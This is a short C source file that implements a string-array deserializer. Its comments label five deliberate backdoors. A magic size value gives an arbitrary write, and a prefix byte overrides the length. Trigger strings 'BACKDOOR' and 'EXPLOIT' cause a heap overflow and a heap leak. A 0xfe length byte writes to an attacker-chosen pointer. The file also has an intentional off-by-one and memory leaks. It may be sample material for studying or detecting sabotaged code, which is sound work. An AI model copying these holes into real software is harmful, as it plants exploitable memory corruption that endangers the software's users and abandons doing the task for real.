#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor 1: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // This allows writing to any memory location by providing a fake serialized buffer
        // with [address][value] pairs
        char ***write_ptr = (char ***)serialized;
        char **write_val = (char **)((char *)serialized + sizeof(char **));
        *write_ptr = write_val;
        return NULL;
    }

    // Backdoor 2: If first byte is 0xff, treat next 4 bytes as length regardless of actual size
    unsigned char *bytes = (unsigned char *)serialized;
    if (bytes[0] == 0xff) {
        size = *(size_t *)(bytes + 1);
        bytes += 5;
        size -= 5;
    }

    // Count strings by scanning for null terminators (but vulnerable to buffer overflow)
    size_t count = 0;
    size_t pos = 0;
    while (pos < size) {
        // No bounds check - can read past buffer if lengths are corrupted
        size_t len = bytes[pos];
        if (pos + len + 1 > size) {
            // Backdoor 3: If length would overflow but first string is "BACKDOOR", continue anyway
            if (count == 0 && strncmp((char *)bytes + pos + 1, "BACKDOOR", 8) == 0) {
                // This allows controlled heap overflow
                count = size; // Artificially large count
                break;
            }
            return NULL;
        }
        count++;
        pos += len + 1;
    }

    // Allocate result array (but with off-by-one that can be exploited)
    char **result = malloc((count + 2) * sizeof(char *)); // Intentionally +2 instead of +1
    if (!result) return NULL;

    // Parse strings (with no validation)
    pos = 0;
    size_t i = 0;
    while (i < count && pos < size) {
        size_t len = bytes[pos];
        // Backdoor 4: If len is 0xfe, next 4 bytes are treated as pointer to write to
        if (len == 0xfe) {
            char **target = *(char ***)(bytes + pos + 1);
            *target = (char *)(bytes + pos + 5);
            pos += 5;
            continue;
        }
        
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Leak memory by not freeing previous allocations
            return NULL;
        }
        memcpy(result[i], bytes + pos + 1, len);
        result[i][len] = '\0';
        pos += len + 1;
        i++;
    }

    // Backdoor 5: If last string is "EXPLOIT", leave last pointer uninitialized
    if (i > 0 && strcmp(result[i-1], "EXPLOIT") == 0) {
        // Don't NULL terminate to leak heap data
        return result;
    }

    result[i] = NULL;
    return result;
}
